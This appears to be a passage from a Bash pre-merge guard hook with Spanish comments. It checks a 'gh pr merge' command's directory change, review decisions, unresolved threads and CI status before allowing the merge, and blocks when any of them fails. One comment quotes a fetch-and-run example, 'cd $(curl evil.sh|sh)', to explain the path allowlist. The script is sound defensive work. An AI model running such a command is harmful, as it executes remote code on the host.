LEADING_CD_ABSOLUTE=true
LEADING_CD_RAW_MISMATCH=false
LEADING_CD_BAD_SHAPE=false
LEADING_CD_STRAY=false
if [ -z "$EXPLICIT_REPO" ] && [[ "$SANITIZED_COMMAND" =~ $CD_STARTS_REGEX ]]; then
  LEADING_CD_SEEN=true
  if [[ "$SANITIZED_COMMAND" =~ $CD_TARGET_REGEX ]]; then
    LEADING_CD_TARGET="${BASH_REMATCH[1]}"
    # [security] Ambigüedad: si aparece OTRO "cd" anclado a posición de
    # comando en el resto del comando, no hay forma confiable de saber
    # cuál cwd está vigente cuando corre el merge — no se asume que el
    # primero es el que aplica. Nota: mira el comando COMPLETO después
    # del primer cd, no solo hasta el merge, así que un cd que aparece
    # DESPUÉS del propio merge (que no le afecta el cwd) también
    # bloquea — falso positivo aceptado, la dirección segura es
    # bloquear de más, no de menos.
    REST_AFTER_CD="${SANITIZED_COMMAND:${#BASH_REMATCH[0]}}"
    if echo "$REST_AFTER_CD" | grep -qE "${GUARD_ANCHOR}cd\s+"; then
      LEADING_CD_AMBIGUOUS=true
    fi

    # [security, ronda 2] Ruta absoluta: CD_TARGET_REGEX ya garantiza un
    # único token sin espacios, pero eso no dice si es relativa — una
    # ruta relativa depende de cuál era el cwd de la sesión cuando el
    # comando real corrió, algo que este guard no puede reconstruir con
    # certeza (mismo motivo por el que "~" tampoco se soporta, ver el
    # comentario de la allowlist de caracteres más abajo).
    [[ "$LEADING_CD_TARGET" == /* ]] || LEADING_CD_ABSOLUTE=false

    # [security, ronda 2, HIGH] Identidad crudo/saneado: guard_sanitize
    # colapsa spans quoted y une continuaciones de línea con un ESPACIO.
    # Un valor como /r/pfx"-real" (la comilla NO abre la ruta, cae a
    # mitad) sobrevive al saneo como /r/pfx (el resto se colapsó a un
    # espacio), pero el shell real hace cd a /r/pfx-real — las comillas
    # no separan el token, solo se quitan. Mismo problema con
    # /r/pfx\<salto de línea>-real: el saneo la une con un espacio (para
    # no romper un merge multilínea legítimo, ver el comentario grande de
    # más arriba en este archivo), pero el shell real la une SIN espacio.
    # La única forma de detectar esto sin ejecutar nada del comando es
    # comparar contra el mismo extraído desde el texto CRUDO: si
    # difieren, el saneo alteró esta ruta específica y no se puede
    # confiar en ella.
    if [[ "$COMMAND" =~ $CD_TARGET_REGEX ]]; then
      RAW_LEADING_CD_TARGET="${BASH_REMATCH[1]}"
    else
      RAW_LEADING_CD_TARGET=""
    fi
    [ "$RAW_LEADING_CD_TARGET" = "$LEADING_CD_TARGET" ] || LEADING_CD_RAW_MISMATCH=true

    # [security, ronda 2, HIGH] Forma exacta: lo único permitido entre el
    # destino del cd y la invocación de merge es "&&" (y solo espacios
    # alrededor, en la misma línea) — ni ";", "|", "&" sueltos (si el cd
    # falla en runtime con esos separadores, el merge corre igual, en la
    # sesión; con "&&" el shell nunca llega al merge si el cd falló, así
    # que no hace falta adivinar qué pasa en ese caso), ni un salto de
    # línea entre medio, ni un segundo comando (otro cd ya lo cubre
    # LEADING_CD_AMBIGUOUS arriba, pero cualquier OTRA cosa — un pipe, un
    # comentario, texto suelto — también tiene que bloquear).
    CD_EXACT_SHAPE_REGEX='^[ \t]*&&[ \t]*gh[ \t]+pr[ \t]+merge([ \t]|$)'
    [[ "$REST_AFTER_CD" =~ $CD_EXACT_SHAPE_REGEX ]] || LEADING_CD_BAD_SHAPE=true
  fi
elif [ -z "$EXPLICIT_REPO" ]; then
  # [security, ronda 2, MEDIUM/HIGH] El comando no ARRANCA con "cd", pero
  # eso no significa que no haya ningún cambio de directorio antes del
  # merge: "true && cd /x && gh pr merge 5", "(cd /x && ...)", "{ cd /x
  # && ...; }", "pushd /x && ...", "builtin cd /x && ...", "eval cd /x &&
  # ...", "command cd /x && ...", "chdir /x && ..." (zsh) y "\cd /x && ..."
  # cambian el cwd real sin que el comando arranque con "cd" — si el
  # guard los ignorara y cayera al cwd de la sesión, reproduciría el
  # incidente original con un disfraz distinto. En vez de enumerar cada
  # forma de invocar el builtin (blocklist frágil — así se colaban
  # pushd/builtin cd/etc. en la ronda 1), se busca cualquiera de estas
  # palabras en posición de comando (GUARD_ANCHOR, con un backslash
  # opcional delante para \cd) en el texto que antecede al merge — si
  # aparece alguna, no se resuelve a ciegas: bloquea.
  #
  # Limitación aceptada: invocar el builtin con su nombre ENTRE COMILLAS
  # ("cd" /x && ...) no se detecta acá, porque guard_sanitize ya colapsó
  # ese span quoted a un espacio antes de esta etapa — el mismo saneo que
  # evita que un mensaje de commit con la frase "cd /tmp" dispare un
  # falso positivo en el resto del archivo. Se acepta el hueco: comillar
  # SOLO el nombre de un builtin no tiene uso legítimo conocido, y este
  # guard protege errores honestos del orchestrator, no evasión
  # adversarial (mismo criterio que el resto de este archivo, ver
  # hooks/lib/guard-matching.sh).
  CD_PREFIX="${SANITIZED_COMMAND%"$ANCHORED_TO_END"}"
  if [ "$CD_PREFIX" = "$SANITIZED_COMMAND" ]; then
    # ANCHORED_TO_END no resultó ser un sufijo real de SANITIZED_COMMAND
    # (no debería pasar: se extrajo del propio SANITIZED_COMMAND) — no se
    # puede aislar con confianza qué antecede al merge.
    LEADING_CD_STRAY=true
  elif echo "$CD_PREFIX" | grep -qE "${GUARD_ANCHOR}"'\\?(cd|pushd|popd|builtin|command|eval|chdir)\b'; then
    LEADING_CD_STRAY=true
  fi
fi

CD_TARGET_FOR_REASON="$LEADING_CD_TARGET"
if [ "${#CD_TARGET_FOR_REASON}" -gt 64 ]; then
  CD_TARGET_FOR_REASON="${CD_TARGET_FOR_REASON:0:64}..."
fi

# Detectar owner/repo: el --repo explícito gana (comportamiento previo,
# intacto — gana sin importar si el comando también hace cd); si no hay
# --repo pero el comando hace cd exactamente en la forma permitida antes
# del merge, se resuelve en ESE directorio; si no hay --repo y algo que
# podría cambiar de directorio aparece en otra posición o forma
# (LEADING_CD_STRAY), bloquea; si no hay ninguna de las tres, fail-closed
# sobre el remoto del cwd de la sesión (comportamiento previo a esta
# extensión, intacto para el caso sin cd y sin --repo).
if [ -n "$EXPLICIT_REPO" ]; then
  REPO="$EXPLICIT_REPO"
elif [ "$LEADING_CD_SEEN" = true ]; then
  if [ -z "$LEADING_CD_TARGET" ]; then
    block "Blocked: el comando hace cd antes de gh pr merge pero no pude extraer una ruta clara para resolver el repo (¿ruta comillada? guard_sanitize colapsa comillas a un espacio) — el guard no verifica a ciegas. Usa --repo explícito."
  fi
  # [security] Allowlist de caracteres, no blocklist — mismo criterio que
  # la validación de --repo. Sin esto, un cd cuyo argumento sobrevive
  # intacto a guard_sanitize (que no toca $(...) ni backticks fuera de
  # comillas) podría traer una sustitución de comando, ej.
  # "cd $(curl evil.sh|sh) && gh pr merge 75": aunque el valor se pase
  # entre comillas dobles a nuestro propio cd más abajo, las comillas
  # dobles de bash NO frenan la expansión de $(...) — solo el
  # word-splitting y el globbing. Resolver el cwd sin esta allowlist
  # terminaría ejecutando lo que el comando pusiera ahí, exactamente lo
  # que la consigna prohíbe ("nada de eval ni ejecutar el comando del
  # usuario para averiguar el cwd"). No se soporta "~" (home) a
  # propósito: expandirlo requeriría no comillar el valor al pasarlo a
  # cd, reabriendo el mismo riesgo — se bloquea fail-closed en vez de
  # adivinar.
  if ! [[ "$LEADING_CD_TARGET" =~ ^[A-Za-z0-9._/-]+$ ]]; then
    block "Blocked: la ruta del cd ('${CD_TARGET_FOR_REASON}') tiene caracteres que no puedo resolver con confianza sin ejecutar nada del comando — el guard no verifica a ciegas. Usa --repo explícito."
  fi
  if [ "$LEADING_CD_ABSOLUTE" = false ]; then
    block "Blocked: la ruta del cd ('${CD_TARGET_FOR_REASON}') no es absoluta — no puedo saber con certeza contra qué directorio se resuelve sin ejecutar el comando. Usa --repo explícito o una ruta absoluta."
  fi
  if [ "$LEADING_CD_RAW_MISMATCH" = true ]; then
    block "Blocked: la ruta del cd no es idéntica en el comando crudo y en el saneado (¿comilla o backslash a mitad de la ruta?) — no puedo confiar en cuál resolvería el shell real. Usa --repo explícito."
  fi
  if [ "$LEADING_CD_AMBIGUOUS" = true ]; then
    block "Blocked: el comando hace más de un cd antes de terminar — no puedo determinar con certeza qué directorio está vigente cuando corre gh pr merge. Usa --repo explícito."
  fi
  if [ "$LEADING_CD_BAD_SHAPE" = true ]; then
    block "Blocked: el cd no está seguido inmediatamente de && y la invocación de gh pr merge en la misma línea — con cualquier otro separador (;, |, &) o contenido entre medio no puedo garantizar que el merge real corra en el directorio que acabo de verificar. Usa --repo explícito."
  fi
  # Subshell vía $(...): el cd de acá adentro no persiste en el resto de
  # este script. "cd --" evita que un valor que empezara con "-" (válido
  # para la allowlist de arriba) se interprete como opción de cd.
  REPO=$(cd -- "$LEADING_CD_TARGET" 2>/dev/null && gh repo view --json nameWithOwner --jq '.nameWithOwner' 2>/dev/null)
  if [ -z "$REPO" ]; then
    block "Blocked: el comando hace cd a '${CD_TARGET_FOR_REASON}' antes de gh pr merge, pero no pude resolver el repo ahí (ruta inexistente o no es un repo de GitHub) — el guard no verifica a ciegas. Usa --repo explícito."
  fi
elif [ "$LEADING_CD_STRAY" = true ]; then
  block "Blocked: el comando tiene algo que podría cambiar el directorio antes de gh pr merge (cd, pushd, u otra forma de invocar el builtin) que no está en la forma exacta 'cd <ruta absoluta> && gh pr merge' que este guard sabe resolver — el guard no verifica a ciegas. Usa --repo explícito."
else
  REPO=$(gh repo view --json nameWithOwner --jq '.nameWithOwner' 2>/dev/null)
  if [ -z "$REPO" ]; then
    block "Blocked: no pude detectar el repo (gh repo view falló). El guard no puede verificar el PR #${PR_NUMBER} — reintenta o revisa la conexión/auth de gh."
  fi
fi
OWNER="${REPO%%/*}"
NAME="${REPO##*/}"

ERRORS=""

# 1. Review decision (CHANGES_REQUESTED) — fail-closed si la consulta falla.
# Nota: reviewDecision es null legítimamente cuando no hay reviews requeridos,
# por eso se distingue "consulta falló" (exit code) de "campo null".
REVIEW_JSON=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json reviewDecision 2>/dev/null)
if [ -z "$REVIEW_JSON" ]; then
  block "Blocked: no pude consultar el PR #${PR_NUMBER} (gh pr view falló). Reintenta — el guard no verifica a ciegas."
fi
REVIEW_DECISION=$(echo "$REVIEW_JSON" | jq -r '.reviewDecision // empty')
if [ "$REVIEW_DECISION" = "CHANGES_REQUESTED" ]; then
  ERRORS="${ERRORS}  - Review bloqueante: hay reviews con CHANGES_REQUESTED\n"
fi

# 2. Threads de review sin resolver (inline). GraphQL es la única API que
# expone isResolved; la REST de comments no distingue resuelto de abierto.
# OWNER/NAME viajan como variables GraphQL (-f, siempre string — sin la
# conversión de tipo "mágica" de -F, que rompería si un nombre fuera todo
# dígitos), no interpolados crudo en el string de la query: con --repo
# ahora aceptando un valor del comando interceptado, interpolar directo
# dejaría un carácter de escape de GraphQL (una comilla, por ejemplo)
# romper la query o alterar su significado. PR_NUMBER sigue interpolado —
# ya viene validado como solo-dígitos por la extracción de arriba.
THREADS_JSON=$(gh api graphql \
  -f owner="$OWNER" \
  -f name="$NAME" \
  -f query='query($owner: String!, $name: String!) { repository(owner: $owner, name: $name) { pullRequest(number: '"$PR_NUMBER"') { reviewThreads(first: 100) { nodes { isResolved } } } } }' \
  2>/dev/null)
if [ -z "$THREADS_JSON" ]; then
  block "Blocked: no pude consultar los threads de review del PR #${PR_NUMBER} (GraphQL falló). Reintenta — el guard no verifica a ciegas."
fi
# jq -e: exit no-cero si el jq falla (ej. .data.repository viene null —
# permisos, repo renombrado, error con HTTP 200 — e indexar .pullRequest
# sobre null revienta) o si el resultado final es null/false. Antes, un jq
# fallido dejaba UNRESOLVED vacío y "${UNRESOLVED:-0}" lo convertía en
# "cero threads sin resolver": el guard pasaba en silencio. `length`
# siempre produce un número (nunca null/false), así que el caso normal de
# 0 threads sin resolver sigue pasando igual.
UNRESOLVED=$(echo "$THREADS_JSON" | jq -e '[.data.repository.pullRequest.reviewThreads.nodes[] | select(.isResolved == false)] | length' 2>/dev/null)
if [ $? -ne 0 ]; then
  block "Blocked: no pude parsear los threads de review del PR #${PR_NUMBER} (respuesta de GraphQL inesperada). Reintenta — el guard no verifica a ciegas."
fi
if [ "$UNRESOLVED" -gt 0 ]; then
  ERRORS="${ERRORS}  - Hay ${UNRESOLVED} thread(s) de review sin resolver. Resuélvelos o respóndelos antes de mergear\n"
fi

# 3. CI checks — gh pr checks sale con rc!=0 tanto si hay checks fallando,
# si la llamada falla, o si el repo no tiene ningún check configurado (caso
# legítimo: 0 fallando, 0 pendientes). Distinguimos "sin checks" de "la
# consulta falló de verdad" por el texto de stderr ("no checks reported"),
# el único indicador que expone gh para este caso.
CHECKS_STDERR_FILE=$(mktemp)
CHECKS_OUTPUT=$(gh pr checks "$PR_NUMBER" --repo "$REPO" 2>"$CHECKS_STDERR_FILE")
NO_CHECKS_CONFIGURED=false
grep -qi 'no checks reported' "$CHECKS_STDERR_FILE" && NO_CHECKS_CONFIGURED=true
rm -f "$CHECKS_STDERR_FILE"

if [ -z "$CHECKS_OUTPUT" ] && [ "$NO_CHECKS_CONFIGURED" = false ]; then
  block "Blocked: no pude consultar los CI checks del PR #${PR_NUMBER}. Reintenta — el guard no verifica a ciegas."
fi
FAILED_CHECKS=$(echo "$CHECKS_OUTPUT" | grep -cE '\bfail\b|\berror\b' || true)
PENDING_CHECKS=$(echo "$CHECKS_OUTPUT" | grep -cE '\bpending\b|\bqueued\b' || true)
if [ "$FAILED_CHECKS" -gt 0 ]; then
  ERRORS="${ERRORS}  - Hay ${FAILED_CHECKS} CI check(s) fallando\n"
fi
if [ "$PENDING_CHECKS" -gt 0 ]; then
  ERRORS="${ERRORS}  - Hay ${PENDING_CHECKS} CI check(s) pendientes\n"
fi

# Si hay errores, bloquear
if [ -n "$ERRORS" ]; then
  REASON=$(printf "Blocked: PR #${PR_NUMBER} no está listo para merge:\n${ERRORS}Resuelve estos issues antes de mergear.")
  echo "{\"decision\":\"block\",\"reason\":$(echo "$REASON" | jq -Rs .)}"
  exit 0
fi

echo '{"continue":true}'
